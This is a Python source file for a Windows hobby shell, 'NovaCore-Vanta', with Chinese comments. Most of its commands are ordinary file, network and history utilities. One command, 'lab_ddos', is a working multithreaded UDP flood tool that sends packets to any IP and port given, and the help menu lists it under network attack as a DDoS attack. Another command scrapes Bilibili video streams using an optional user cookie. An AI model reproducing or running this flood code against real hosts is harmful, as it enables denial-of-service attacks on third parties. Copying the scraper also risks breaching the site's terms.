# NovaCore-Vanta.py
# Windows 10 Minimal Super Terminal v1.2.0
import os
import sys
import subprocess
import shlex
import shutil   # for which & file operations
import socket, threading, time, itertools
import requests, re, json
from lxml import etree

# Set console title
os.system("title NovaCore-Vanta")

# Welcome banner (English + version)
BANNER = r"""
┌────────────────────────────────────────────┐
│                                            │
│         NOVACORE-VANTA  v1.2.0             │
│                                            │
│         Windows 10  Super Terminal         │
│                                            │
└────────────────────────────────────────────┘
Type 'help' for commands, 'exit' to quit.
"""
print(BANNER)

# ---------------- Built-in Commands ----------------
def builtin_ls(_):
    """ls / dir —— 列目录"""
    from pathlib import Path
    try:
        import colorama
        colorama.just_fix_windows_console()
        BLUE, RESET = colorama.Fore.BLUE, colorama.Style.RESET_ALL
    except ImportError:
        BLUE = RESET = ""
    cwd = Path.cwd()
    for p in sorted(cwd.iterdir()):
        icon = BLUE + p.name + RESET if p.is_dir() else p.name
        print(icon)

def builtin_cat(args):
    """cat <文件>  查看文本文件"""
    if not args:
        print("用法: cat <文件>")
        return
    path = " ".join(args)
    try:
        with open(os.path.expandvars(os.path.expanduser(path)), "r", encoding="utf-8") as f:
            sys.stdout.write(f.read())
    except Exception as e:
        print(f"cat 失败: {e}")

def builtin_touch(args):
    """touch <文件>  创建空文件或更新修改时间"""
    if not args:
        print("用法: touch <文件>")
        return
    path = " ".join(args)
    try:
        full = os.path.expandvars(os.path.expanduser(path))
        with open(full, "a"):
            os.utime(full)
    except Exception as e:
        print(f"touch 失败: {e}")

def builtin_history(_):
    """history —— 显示历史命令编号列表"""
    for idx, cmd in enumerate(HISTORY, 1):
        print(f"{idx:4}  {cmd}")

def builtin_env(_):
    """env / set —— 打印当前所有环境变量"""
    for k, v in os.environ.items():
        print(f"{k}={v}")

def builtin_export(args):
    """export key=value —— 临时设置环境变量"""
    if not args or "=" not in args[0]:
        print("用法: export key=value")
        return
    k, v = args[0].split("=", 1)
    os.environ[k] = v

def builtin_calc(args):
    """calc 表达式 —— 简易四则运算"""
    expr = " ".join(args)
    try:
        print(eval(expr, {"__builtins__": {}}))
    except Exception as e:
        print(f"calc 失败: {e}")

def builtin_uptime(_):
    """uptime —— 显示系统运行时长"""
    import datetime
    try:
        import psutil
        boot = datetime.datetime.fromtimestamp(psutil.boot_time())
        delta = datetime.datetime.now() - boot
        print(f"已运行 {delta}")
    except ImportError:
        print("uptime 需要 psutil，执行  pip install psutil  后可用")

def builtin_reload(_):
    """reload —— 重启本终端"""
    print("正在重启 NovaCore-Vanta ...")
    os.execv(sys.executable, [sys.executable] + sys.argv)

def builtin_pip(args):
    """pip install 包名 —— 内嵌 pip"""
    subprocess.run([sys.executable, "-m", "pip"] + args)

def builtin_edit(args):
    """edit <文件> —— 用默认编辑器打开文件"""
    if not args:
        print("用法: edit <文件>")
        return
    path = " ".join(args)
    editor = os.environ.get("EDITOR") or ("code.cmd" if shutil.which("code") else "notepad")
    subprocess.run([editor, os.path.expandvars(os.path.expanduser(path))])

def builtin_wget(args):
    """wget <URL> —— 极简下载文件到当前目录"""
    if not args:
        print("用法: wget <URL>")
        return
    url = args[0]
    try:
        import requests
        name = url.split("/")[-1] or "download"
        print(f"下载 {url}  →  {name}")
        r = requests.get(url, stream=True)
        r.raise_for_status()
        with open(name, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        print("下载完成")
    except Exception as e:
        print("wget 失败:", e)

def builtin_py(_):
    """py —— 进入交互式 Python 解释器"""
    import code
    code.interact(local=globals())

# ↓↓↓ 新增 5 条命令 ↓↓↓
def builtin_which(args):
    """which <命令> —— 查找可执行文件路径"""
    if not args:
        print("用法: which <命令>")
        return
    for a in args:
        full = shutil.which(a)
        print(full if full else f"{a}: 未找到")

def builtin_grep(args):
    """grep <模式> [文件...] —— 在文件里搜索文本"""
    if len(args) < 1:
        print("用法: grep <模式> [文件1 文件2 ...]")
        return
    pattern, *files = args
    import re, glob
    regex = re.compile(pattern, re.I)
    targets = files or glob.glob("*")
    for fp in targets:
        if not os.path.isfile(fp):
            continue
        try:
            with open(fp, encoding="utf-8") as f:
                for nr, line in enumerate(f, 1):
                    if regex.search(line):
                        print(f"{fp}:{nr}:{line.rstrip()}")
        except Exception as e:
            print(f"{fp}: {e}")

def builtin_cp(args):
    """cp <源> <目标> —— 复制文件或目录"""
    if len(args) != 2:
        print("用法: cp <源> <目标>")
        return
    src, dst = map(lambda x: os.path.expandvars(os.path.expanduser(x)), args)
    try:
        if os.path.isdir(src):
            shutil.copytree(src, dst, dirs_exist_ok=True)
        else:
            shutil.copy2(src, dst)
    except Exception as e:
        print(f"cp 失败: {e}")

def builtin_mv(args):
    """mv <源> <目标> —— 移动或重命名"""
    if len(args) != 2:
        print("用法: mv <源> <目标>")
        return
    src, dst = map(lambda x: os.path.expandvars(os.path.expanduser(x)), args)
    try:
        shutil.move(src, dst)
    except Exception as e:
        print(f"mv 失败: {e}")

def builtin_rm(args):
    """rm <路径> [路径...] —— 删除文件或空目录"""
    if not args:
        print("用法: rm <文件|目录> ...")
        return
    for p in args:
        path = os.path.expandvars(os.path.expanduser(p))
        try:
            if os.path.isdir(path):
                os.rmdir(path)
            else:
                os.remove(path)
        except Exception as e:
            print(f"rm {p}: {e}")

# ---------------- 历史记录 ----------------
HISTORY_FILE = os.path.expanduser(r"~\.novacore_history")
def load_history():
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE, encoding="utf-8") as f:
            return [line.rstrip("\n") for line in f]
    return []
def save_history(entry):
    with open(HISTORY_FILE, "a", encoding="utf-8") as f:
        f.write(entry + "\n")
HISTORY = load_history()



def builtin_lab_ddos(args):

        # 如果参数不足 4 个，给出提示并返回
    if len(args) < 4:
        print("输入有问题！！！")
        print("用法：lab_ddos <ip> <port> <threads> <seconds>")
        print("示例：lab_ddos 127.0.0.1 5201 50 30")
        return

    # 现在一定能安全转换
    ip      = args[0]
    port    = int(args[1])
    threads = int(args[2])
    seconds = int(args[3])


    print(f"🚀 启动 UDP Flood：{ip}:{port}  并发={threads}  时长={seconds}s")
    stop_flag = threading.Event()
    counter = itertools.count(1)          # 线程安全的递增序号

    def flood():
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"A" * 1024
        for seq in counter:
            if stop_flag.is_set():
                break
            try:
                udp.sendto(payload, (ip, port))
                # 实时打印：线程号 + 包序号
                print(f"[T{threading.get_ident()}-{seq}] → {ip}:{port}")
            except Exception as e:
                print(f"[T{threading.get_ident()}] send error: {e}")
        udp.close()

    # 启动线程
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()

    try:
        time.sleep(seconds)
    except KeyboardInterrupt:
        pass
    finally:
        stop_flag.set()
        print("攻击已停止。")

def builtin_lab_dlbili(args):
    if not args:
        print("用法：lab_dlbili <URL 或 BV 号> [Cookie]")
        return

    # ------------------------------------------------------------------
    # ① 先找 ffmpeg，找不到就报错并给出下载链接
    # ------------------------------------------------------------------
    ffmpeg_bin = shutil.which("ffmpeg")                       # PATH 里找
    if not ffmpeg_bin:
        # 再扫几个常见安装目录
        for cand in (
            r"C:\ffmpeg\bin\ffmpeg.exe",
            r"C:\Program Files\FFmpeg\bin\ffmpeg.exe",
            r"%USERPROFILE%\scoop\apps\ffmpeg\current\bin\ffmpeg.exe",
            r"%USERPROFILE%\chocolatey\bin\ffmpeg.exe",
        ):
            cand = os.path.expandvars(cand)
            if os.path.isfile(cand):
                ffmpeg_bin = cand
                break
    if not ffmpeg_bin:
        print("❌  未检测到 ffmpeg.exe，请先安装后再试！")
        print("   官方下载：https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-8.0-essentials_build.zip")
        print("   安装后把 ffmpeg.exe 所在目录加入到系统 PATH")
        return
    # ------------------------------------------------------------------

    raw = args[0]
    if raw.startswith("http"):
        url = raw
        bv  = raw.split("/")[-1].split("?")[0]
    else:
        bv  = raw
        url = f"https://www.bilibili.com/video/{bv}"

    cookie = args[1] if len(args) > 1 else ""
    out_dir = "b站视频"
    os.makedirs(out_dir, exist_ok=True)

    headers = {
        "cookie": cookie,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    }

    resp_ = requests.get(url, headers=headers)
    resp  = resp_.text
    resp_.close()

    tree  = etree.HTML(resp)
    title = tree.xpath('//h1/text()')[0]

    # 解析 playinfo
    try:
        info_text = tree.xpath('/html/head/script[4]/text()')[0]
        info_text = re.sub(r'window\.__playinfo__=', '', info_text)
        playinfo  = json.loads(info_text)
    except Exception:
        info_text = tree.xpath('/html/head/script[3]/text()')[0]
        info_text = re.sub(r'window\.__playinfo__=', '', info_text)
        playinfo  = json.loads(info_text)

    # 取最高画质
    video_url = max(playinfo['data']['dash']['video'], key=lambda v: v['id'])['backupUrl'][0]
    audio_url = max(playinfo['data']['dash']['audio'], key=lambda a: a['id'])['backupUrl'][0]

    print("正在下载：", title)

    headers_down = {
        "referer": url,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36",
    }

    # 下载
    video_bytes = requests.get(video_url, headers=headers_down).content
    audio_bytes = requests.get(audio_url, headers=headers_down).content

    # 保存
    safe_title = re.sub(r'[\\/:*?"<>|\n]', '_', title)
    tmp_name   = f"{safe_title}0"
    v_path     = os.path.join(out_dir, f"{tmp_name}.mp4")
    a_path     = os.path.join(out_dir, f"{tmp_name}.flac")
    final_path = os.path.join(out_dir, f"{safe_title}.mp4")

    with open(v_path, "wb") as f: f.write(video_bytes)
    with open(a_path, "wb") as f: f.write(audio_bytes)

    # 合并
    cmd = [
        ffmpeg_bin, "-hide_banner", "-loglevel", "error",
        "-i", v_path, "-i", a_path,
        "-c:v", "copy", "-c:a", "copy", final_path
    ]
    subprocess.run(cmd, check=True)

    # 清理
    os.remove(v_path)
    os.remove(a_path)

    print("下载完成 →", final_path)


# ---------------- 内建命令总表 ----------------
BUILTINS = {
    "ls": builtin_ls,
    "dir": builtin_ls,
    "cat": builtin_cat,
    "touch": builtin_touch,
    "history": builtin_history,
    "env": builtin_env,
    "set": builtin_env,
    "export": builtin_export,
    "calc": builtin_calc,
    "uptime": builtin_uptime,
    "reload": builtin_reload,
    "pip": builtin_pip,
    "edit": builtin_edit,
    "wget": builtin_wget,
    "py": builtin_py,
    "which": builtin_which,
    "grep": builtin_grep,
    "cp": builtin_cp,
    "mv": builtin_mv,
    "rm": builtin_rm,
    "lab_ddos": builtin_lab_ddos,
    "lab_dlbili": builtin_lab_dlbili,
}

# ---------------- 主循环 ----------------
def main():
    while True:
        try:
            cmd = input(f"{os.getcwd()}> ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nbye~")
            break

        if not cmd:
            continue

        # 记录历史
        HISTORY.append(cmd)
        save_history(cmd)

        # 解析 bang 命令（!n）
        if cmd.startswith("!") and cmd[1:].isdigit():
            try:
                cmd = HISTORY[int(cmd[1:]) - 1]
                print(f"!> {cmd}")
            except IndexError:
                print("历史编号无效")
                continue

        # 解析并执行内建命令
        parts = shlex.split(cmd)
        if not parts:
            continue
        name, *args = parts
        low = name.lower()
        if low in {"exit", "quit"}:
            print("NovaCore-Vanta 已关闭。")
            break
        elif low == "help":
            print("""ls
基础命令：
  help        显示本帮助
  cls         清屏
  cd 路径     切换当前目录
  exit / quit 退出程序

文件与目录：
  ls / dir    列出当前目录内容
  cat 文件    查看文本文件
  touch 文件  创建空文件或更新修改时间
  cp 源 目标  复制文件或目录
  mv 源 目标  移动或重命名
  rm 路径...  删除文件或空目录
  edit 文件   用默认编辑器打开文件

系统与网络：
  env / set   打印所有环境变量
  export k=v  临时设置环境变量
  uptime      查看系统已运行时长
  which 命令  查找可执行文件完整路径
  wget URL    简易下载文件到当前目录
  pip ...     直接调用 pip 安装/管理包

网络攻击与渗透：
  lab_ddos    DDos攻击
  lab_dlbili  BiliBili视频数据爬取

其他：
  history     显示历史命令列表
  !n          执行历史第 n 条命令
  calc 表达式 简易计算器（支持 + - * /）
  py          进入交互式 Python 解释器
  reload      重启本终端
""")
            continue
        elif low == "cls":
            os.system("cls")
            continue
        elif low == "cd":
            path = " ".join(args).strip('"')
            try:
                os.chdir(os.path.expandvars(os.path.expanduser(path)))
            except FileNotFoundError:
                print(f"路径不存在: {path}")
            continue
        elif low in BUILTINS:
            BUILTINS[low](args)
            continue

        # 外部命令
        try:
            subprocess.run(f'cmd /c "{cmd}"', shell=True)
        except Exception as e:
            print(f"执行失败: {e}")

if __name__ == "__main__":
    main()
